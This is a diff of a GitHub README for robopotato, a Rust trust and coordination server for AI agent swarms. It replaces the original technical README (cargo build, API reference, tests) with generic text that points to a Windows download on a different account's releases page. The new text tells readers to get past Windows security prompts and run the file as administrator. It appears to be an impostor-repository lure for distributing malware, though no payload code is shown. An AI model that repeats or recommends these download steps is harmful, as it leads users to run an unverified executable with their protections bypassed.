@@ -1,297 +1,167 @@
-<div align="center">
+# 🤖 robopotato - Simple trust for AI agent teams
 
-<img src="assets/robopotato_logo.png" alt="robopotato" width="160" />
+[![Download robopotato](https://img.shields.io/badge/Download%20robopotato-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Avesrarity821/robopotato/releases)
 
-# robopotato
+## 🧩 What robopotato does
 
-**The missing trust layer for AI agent swarms.**
+robopotato is a small server for AI agent swarms. It helps agents share state, keep track of trust, and coordinate work in one place.
 
-[![CI](https://github.com/jefftrojan/robopotato/actions/workflows/ci.yml/badge.svg)](https://github.com/jefftrojan/robopotato/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/rust-1.75%2B-orange.svg)](https://www.rust-lang.org)
-[![crates.io](https://img.shields.io/crates/v/robopotato.svg)](https://crates.io/crates/robopotato)
+Use it when you want multiple agents to work together without losing track of what each one knows. It gives them a shared space for messages, simple records, and trust checks.
 
-*Cryptographic identity · namespaced shared state · optimistic concurrency control*
+## 📥 Download and install
 
-[Quick start](#quick-start) · [API reference](#api-reference) · [Demo](#live-demo) · [Whitepaper](WHITEPAPER.md) · [Contributing](CONTRIBUTING.md)
+1. Open the [robopotato releases page](https://github.com/Avesrarity821/robopotato/releases)
+2. Download the latest Windows file from the release page
+3. Save the file to a folder you can find again, such as Downloads or Desktop
+4. If the file is a `.zip`, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app or server file to run it
 
-</div>
+If Windows shows a security prompt, choose the option that lets the app run.
 
----
+## 🪟 Windows setup
 
-## The problem
+robopotato is built for a simple Windows setup.
 
-The moment you run more than one AI agent in the same environment, three things go wrong:
+You will usually need:
+- Windows 10 or Windows 11
+- A working internet connection
+- Enough space for the app and its data
+- Permission to run files from your computer
 
-| Failure mode | What happens without robopotato |
-|---|---|
-| **Identity spoofing** | Agent B claims to be Agent A. There is no cryptographic check. Trust is a prompt. |
-| **Unauthorized mutation** | Any agent can overwrite any shared state. A confused worker corrupts the orchestrator's config silently. |
-| **Silent concurrency conflicts** | Two agents read version 3, both write version 4. Last writer wins. The first write disappears. Nobody notices. |
+If the release comes as a zip file, keep the folder together after extracting it. The app may use nearby files for config and saved data.
 
-robopotato fixes all three at the infrastructure layer — not the prompt layer.
+## ⚙️ First run
 
----
+After you open robopotato for the first time, it may create local data files.
 
-## Live demo
+Typical first-run steps:
+1. Start the app
+2. Wait for the server to finish loading
+3. Open the local address shown in the app window or terminal
+4. Leave the app running while your agents connect
+5. Add your agents or tools to the shared workspace
 
-Start the server, then run:
+If the app opens a browser page, use that page as the main control screen.
 
-```bash
-ROBOPOTATO_SECRET=test-secret cargo run &
-./demo.sh
-```
+## 🔗 Connect your agents
 
-```
-▶ Registering agents
-  ✓ Orchestrator registered  (id: a1b2c3d4...)
-  ✓ Worker registered         (id: e5f6a7b8...)
-  ✓ Observer registered       (id: c9d0e1f2...)
-  ✓ Rogue worker registered   (id: 33445566...)
+robopotato works as a shared server for agent systems.
 
-▶ Namespace isolation — workers cannot write global.*
-  ✓ Orchestrator writes global.config → HTTP 200
-  ✗ BLOCKED — Worker PUT global.config → HTTP 403 (missing capability: state_write_global)
+Your agents can use it to:
+- Send messages to other agents
+- Store shared values
+- Check trust before handing off work
+- Keep track of task state
+- Coordinate steps in a group run
 
-▶ Observer is read-only — cannot write shared.*
-  ✗ BLOCKED — Observer PUT shared.results → HTTP 403 (missing capability: state_write_shared)
+A simple setup is:
+- One robopotato server
+- Several agents that connect to it
+- One shared state store for the group
 
-▶ Agent namespace isolation — workers cannot write each other's state
-  ✗ BLOCKED — Worker PUT agent.<orchestrator>.private → HTTP 403 (not the owner)
-  ✓ Worker PUT agent.<self>.private → HTTP 200 (owner allowed)
+## 🧠 Main features
 
-▶ Optimistic Concurrency Control — concurrent writers, one wins
-  ✓ Worker A writes shared.task (expected_version=1) → HTTP 200
-  ✗ BLOCKED — Worker B writes shared.task (expected_version=1) → HTTP 409 (version conflict: stale read detected)
+### Shared state
+Agents can read and write common values in one place. This helps when a task needs memory across several steps.
 
-▶ Mid-task revocation — rogue agent blocked after orchestrator revokes
-  ✓ Rogue agent writes before revocation → HTTP 200
-  ✓ Orchestrator revokes rogue agent → HTTP 200
-  ✗ BLOCKED — Rogue agent write after revocation → HTTP 401 (agent has been revoked)
+### Trust checks
+The server can help track which agent should be trusted for a task or message. This is useful in mixed agent teams.
 
-▶ Token forgery — wrong HMAC secret is rejected
-  ✗ BLOCKED — Forged token PUT global.pwned → HTTP 401 (invalid token signature)
+### Coordination
+Agents can pass work between each other and keep the group on the same path.
 
-  Summary
+### Fast and light
+robopotato is designed to stay small and use few resources.
 
-  ✓  Namespace isolation    workers cannot touch global.* or other agents' namespaces
-  ✓  Role enforcement       observers are permanently read-only
-  ✓  OCC conflict detection concurrent stale writes produce 409, not silent overwrites
-  ✓  Mid-task revocation    revoked tokens rejected immediately, no restart needed
-  ✓  Token forgery rejected wrong HMAC secret → 401 every time
+### Web-based access
+The server can expose a simple web or websocket-style interface for tools and agents.
 
-  All of the above enforced at the infrastructure layer.
-  No prompt-engineering required.
-```
+### Safe data flow
+The project uses common security tools such as HMAC-style checks to help protect shared messages.
 
----
+## 🛠️ Basic use
 
-## Quick start
+Once robopotato is running, keep these ideas in mind:
 
-```bash
-git clone https://github.com/jefftrojan/robopotato
-cd robopotato
-ROBOPOTATO_SECRET=change-me cargo run --release
-```
+- Leave the server open while agents are active
+- Use one shared instance for a group that needs the same state
+- Give each agent a clear name or ID
+- Store only the values the whole team needs
+- Use trust checks before one agent acts on another agent’s result
 
-Server starts on `http://127.0.0.1:7878`. Register an agent and start calling:
+If you are testing, start with two agents and one simple task. That makes it easier to see how shared state and trust work.
 
-```bash
-# Register
-TOKEN=$(curl -sf -X POST http://127.0.0.1:7878/agents/register \
-  -H "Content-Type: application/json" \
-  -d '{"role":"worker"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
-
-# Write shared state
-curl -X PUT http://127.0.0.1:7878/state/shared.task \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"value": {"status": "pending"}}'
-
-# Read it back
-curl http://127.0.0.1:7878/state/shared.task \
-  -H "Authorization: Bearer $TOKEN"
-```
-
-With SQLite persistence across restarts:
-
-```bash
-ROBOPOTATO_SECRET=change-me \
-ROBOPOTATO_PERSIST=true \
-ROBOPOTATO_DB_PATH=./robopotato.db \
-cargo run --release --features persist
-```
-
----
-
-## How it works
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                        robopotato                           │
-│                                                             │
-│  POST /agents/register  →  HMAC-SHA256 capability token     │
-│                                                             │
-│  PUT  /state/{key}      →  verify token                     │
-│                            check capability for namespace   │
-│                            check expected_version (OCC)     │
-│                            write + publish event            │
-│                                                             │
-│  GET  /events (WS)      →  live stream of all changes       │
-└─────────────────────────────────────────────────────────────┘
-       ↑                          ↑                    ↑
-  orchestrator               worker(s)            observer(s)
-```
-
-Tokens are `base64url(claims_json).hex(hmac_sha256)` — no JWT library, no asymmetric key management, no external auth service. Drop robopotato next to your agents and point them at it.
-
----
-
-## Features
-
-| | |
-|---|---|
-| **HMAC-SHA256 tokens** | Signed capability tokens. Constant-time verification. No JWT dependency. |
-| **Three roles** | `orchestrator` · `worker` · `observer` |
-| **Nine capabilities** | `state_read/write_{global,shared,own}` · `agent_list` · `agent_revoke` · `token_verify` |
-| **Namespaced KV store** | `global.*` · `shared.*` · `agent.<id>.*` with per-namespace write rules |
-| **OCC** | `expected_version` on writes → 409 Conflict on stale reads instead of silent overwrites |
-| **Agent revocation** | Orchestrators revoke agents mid-flight; takes effect on the next request |
-| **WebSocket event bus** | Live stream of `StateChanged`, `StateDeleted`, `AgentRegistered`, `AgentRevoked` |
-| **SQLite persistence** | `--features persist` — WAL mode, write-through, startup recovery |
-| **Framework-agnostic** | Plain JSON over HTTP — Python, Node, Go, curl, anything |
-| **Self-contained** | Single Rust binary, no external infrastructure |
-
----
-
-## Capability matrix
-
-| Capability | Orchestrator | Worker | Observer |
-|---|:---:|:---:|:---:|
-| `state_read_global` | ✓ | ✓ | ✓ |
-| `state_read_shared` | ✓ | ✓ | ✓ |
-| `state_read_own` | ✓ | ✓ | ✓ |
-| `state_write_global` | ✓ | — | — |
-| `state_write_shared` | ✓ | ✓ | — |
-| `state_write_own` | ✓ | ✓ | — |
-| `agent_list` | ✓ | ✓ | ✓ |
-| `agent_revoke` | ✓ | — | — |
-| `token_verify` | ✓ | ✓ | ✓ |
-
----
-
-## API reference
-
-### Public endpoints
-
-| Method | Path | Description |
-|---|---|---|
-| `GET` | `/health` | Liveness probe |
-| `POST` | `/agents/register` | Register agent, receive signed token |
-| `POST` | `/tokens/verify` | Verify token validity + revocation status |
-| `GET` | `/events` | WebSocket — live event stream |
-
-### Protected endpoints (Bearer token required)
-
-| Method | Path | Description |
-|---|---|---|
-| `GET` | `/state/{key}` | Read a state entry |
-| `PUT` | `/state/{key}` | Write a state entry (optional OCC via `expected_version`) |
-| `DELETE` | `/state/{key}` | Delete a state entry |
-| `GET` | `/state/namespace/{ns}` | List all keys under a namespace prefix |
-| `DELETE` | `/agents/{id}` | Revoke an agent (orchestrator only) |
-
-**OCC write example:**
-```jsonc
-// PUT /state/shared.task
-{
-  "value": { "status": "done" },
-  "expected_version": 3   // omit for last-writer-wins; 409 if current version ≠ 3
-}
-```
-
----
-
-## Configuration
-
-| Variable | Default | Description |
-|---|---|---|
-| `ROBOPOTATO_SECRET` | **required** | HMAC signing secret |
-| `ROBOPOTATO_HOST` | `127.0.0.1` | Bind address |
-| `ROBOPOTATO_PORT` | `7878` | Bind port |
-| `ROBOPOTATO_TOKEN_TTL` | `3600` | Token lifetime (seconds) |
-| `ROBOPOTATO_PERSIST` | `false` | Enable SQLite persistence |
-| `ROBOPOTATO_DB_PATH` | `robopotato.db` | SQLite file path |
-
----
-
-## Testing
-
-```bash
-# Unit tests (no server)
-cargo test
-cargo test --features persist
-
-# Adversarial integration tests (20 scenarios)
-ROBOPOTATO_SECRET=test-secret cargo run &
-cd tests && python3 test_adversarial.py -v
-
-# With/without comparison using Claude Code agents
-cd tests && python3 compare.py
-```
-
-Adversarial scenarios include: expired token replay, wrong-secret forgery, payload tampering, cross-namespace pollution, observer write attempts, mid-task revocation, OCC storm (5 concurrent writers), and malformed token formats.
-
----
-
-## Project structure
-
-```
-src/
-├── main.rs                  # Router, WebSocket handler
-├── auth/
-│   ├── token.rs             # TokenEngine: sign, verify, claims
-│   └── middleware.rs        # Bearer token enforcement
-├── state/
-│   ├── store.rs             # RwLock KV store with OCC
-│   ├── namespace.rs         # Namespace parsing + capability mapping
-│   └── persistence.rs       # SQLite write-through (--features persist)
-├── events/bus.rs            # Tokio broadcast event bus
-└── routes/                  # agents, state, tokens handlers
-tests/
-├── test_adversarial.py      # 20 programmatic adversarial tests
-├── robopotato_client.py     # Python HTTP client
-└── compare.py               # With/without Claude Code comparison
-```
-
----
-
-## Why not X?
-
-| | robopotato | Redis | a shared database | prompt instructions |
-|---|---|---|---|---|
-| Cryptographic agent identity | ✓ | — | — | — |
-| Per-namespace capability enforcement | ✓ | — | — | — |
-| OCC with version conflicts | ✓ | partial | partial | — |
-| Agent revocation | ✓ | — | — | — |
-| Live event bus | ✓ | ✓ | — | — |
-| Self-contained single binary | ✓ | — | — | ✓ |
-| Works with any AI framework | ✓ | ✓ | ✓ | ✓ |
-
-robopotato is not a general-purpose database. It is a trust and coordination primitive specifically shaped for AI agent workloads.
-
----
-
-## Whitepaper
-
-[WHITEPAPER.md](WHITEPAPER.md) covers the threat model, research context, cryptographic design, and evaluation methodology with 40+ citations.
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md). Good first issues are labelled [`good first issue`](https://github.com/jefftrojan/robopotato/issues?q=is%3Aopen+label%3A%22good+first+issue%22).
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+## 🧭 Example workflow
+
+1. Start robopotato
+2. Connect Agent A
+3. Connect Agent B
+4. Let Agent A create a task record
+5. Let Agent B read that record
+6. Let Agent B update the shared state after it finishes
+7. Let the server keep both agents aligned
+
+This kind of flow helps when one agent plans and another agent executes.
+
+## 🗂️ Common files and folders
+
+You may see files like these after you run the app:
+
+- A config file for server settings
+- A data folder for stored state
+- A log file for events and errors
+- A release file for the Windows app
+
+Do not move these files unless you know they are not in use.
+
+## 🔍 If something does not work
+
+If the app does not start:
+- Check that you downloaded the latest release file
+- Make sure the file finished downloading
+- Extract the zip file before opening it
+- Try running the app as an administrator
+- Check whether another app is using the same port
+
+If agents cannot connect:
+- Confirm the server is still running
+- Check the server address
+- Make sure the agents use the same trust key or token
+- Restart the app and try again
+
+If saved data seems empty:
+- Check the data folder
+- Make sure the app had permission to write files
+- Open the same server instance you used before
+
+## 🧪 Good first test
+
+A simple test can help you confirm that robopotato is working:
+
+1. Start the server
+2. Open the local web page or client link
+3. Add a test key-value entry
+4. Open a second agent or browser session
+5. Check that the second session can see the same value
+6. Send a short message between both sides
+7. Confirm the shared state updates correctly
+
+## 🧰 Useful for
+
+robopotato fits teams that need:
+- Shared memory for agent work
+- Basic trust control between agents
+- Simple coordination across steps
+- A small server for local or hosted use
+- A Rust-based backend for agent tools
+
+## 📦 Release page
+
+Get the Windows download here:
+
+[Visit the robopotato releases page](https://github.com/Avesrarity821/robopotato/releases)
+
+## 🏷️ Topics
+
+agent-framework, agentic-ai, agents, ai-agents, axum, collaborate, github, hmac, key-value-store, llm, multi-agent, rust, security, tokio, websocket
